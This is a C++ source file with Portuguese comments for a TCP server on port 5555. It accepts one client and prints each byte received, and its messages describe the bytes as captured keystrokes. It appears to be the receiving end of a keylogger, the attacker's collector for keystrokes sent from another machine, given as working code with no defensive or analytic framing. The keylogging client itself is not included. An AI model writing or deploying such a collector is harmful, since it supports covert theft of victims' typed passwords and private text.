#include <arpa/inet.h>   // Para inet_addr, htons, etc.
#include <netinet/in.h>  // Para struct sockaddr_in
#include <sys/socket.h>  // Para socket functions
#include <unistd.h>      // Para close()
#include <iostream>

#define SERVER_PORT 5555  // Porta do servidor

int main() {
    int serverSock, clientSock;
    sockaddr_in serverAddr, clientAddr;
    char buffer[2];
    socklen_t clientAddrSize = sizeof(clientAddr);

    // Cria o socket
    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        std::cerr << "Erro ao criar socket" << std::endl;
        return 1;
    }

    // Configura o endereço do servidor
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);  // Define a porta em ordem de bytes de rede
    serverAddr.sin_addr.s_addr = INADDR_ANY;   // Aceita conexões de qualquer interface

    // Faz bind na porta especificada
    if (bind(serverSock, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "Erro no bind" << std::endl;
     close(serverSock);  // Fecha o socket em caso de erro
        return 1;
    }

    // Escuta por conexões
    if (listen(serverSock, 5) < 0) {
        std::cerr << "Erro ao escutar por conexões" << std::endl;
        close(serverSock);
        return 1;
    }

    std::cout << "Aguardando conexão..." << std::endl;

    // Aceita a conexão do cliente
    clientSock = accept(serverSock, (sockaddr*)&clientAddr, &clientAddrSize);
    if (clientSock < 0) {
        std::cerr << "Erro ao aceitar conexão" << std::endl;
        close(serverSock);
        return 1;
    }

    std::cout << "Cliente conectado. Exibindo teclas capturadas..." << std::endl;

    // Recebe e exibe teclas em uma única linha
    while (true) {
        int bytesReceived = recv(clientSock, buffer, 1, 0);
        if (bytesReceived > 0) {
            buffer[1] = '\0';  // Adiciona o terminador de string
            std::cout << buffer;  // Exibe as teclas na mesma linha
            std::cout.flush();    // Garante que a saída seja impressa imediatamente
        } else if (bytesReceived == 0) {
            std::cout << "\nConexão fechada pelo cliente" << std::endl;
            break;
        } else {
            std::cerr << "Erro ao receber dados" << std::endl;
            break;
        }
    }

    // Fecha os sockets após o término da conexão
    close(clientSock);
    close(serverSock);

    return 0;
}

